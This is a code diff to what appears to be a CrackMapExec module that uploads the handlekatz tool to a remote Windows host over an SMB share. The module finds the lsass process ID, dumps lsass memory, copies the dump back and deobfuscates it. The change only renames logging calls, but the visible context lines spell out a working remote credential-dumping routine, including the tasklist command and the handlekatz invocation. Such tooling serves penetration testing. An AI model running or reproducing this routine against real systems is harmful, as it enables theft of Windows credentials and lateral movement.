@@ -56,7 +56,7 @@ class CMEModule:
             with open(self.handlekatz_path + self.handlekatz, 'wb') as handlekatz:
                 handlekatz.write(self.handlekatz_embeded)
     
-        context.log.info('Copy {} to {}'.format(self.handlekatz_path + self.handlekatz, self.tmp_dir))
+        context.log.display('Copy {} to {}'.format(self.handlekatz_path + self.handlekatz, self.tmp_dir))
         with open(self.handlekatz_path + self.handlekatz, 'rb') as handlekatz:
             try:
                 connection.conn.putFile(self.share, self.tmp_share + self.handlekatz, handlekatz.read)
@@ -66,11 +66,11 @@ class CMEModule:
     
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.info('Getting lsass PID {}'.format(command))
+        context.log.display('Getting lsass PID {}'.format(command))
         p = connection.execute(command, True)
         pid = p.split(',')[1][1:-1]
         command = self.tmp_dir + self.handlekatz + ' --pid:' + pid + ' --outfile:' + self.tmp_dir + '%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.log'
-        context.log.info('Executing command {}'.format(command))
+        context.log.display('Executing command {}'.format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
         dump = False
@@ -87,10 +87,10 @@ class CMEModule:
             if matches:
                 machine_name = matches.group()
             else:
-                context.log.info("Error getting the lsass.dmp file name")
+                context.log.display("Error getting the lsass.dmp file name")
                 sys.exit(1)
 
-            context.log.info('Copy {} to host'.format(machine_name))
+            context.log.display('Copy {} to host'.format(machine_name))
 
             with open(self.dir_result + machine_name, 'wb+') as dump_file:
                 try:
@@ -117,7 +117,7 @@ class CMEModule:
             bytes_in = bytearray(h_in.read())
             bytes_in_len = len(bytes_in)
 
-            context.log.info("Deobfuscating, this might take a while")
+            context.log.display("Deobfuscating, this might take a while")
             
             chunks = [bytes_in[i:i+1000000] for i in range(0, len(bytes_in), 1000000)]
             for chunk in chunks:
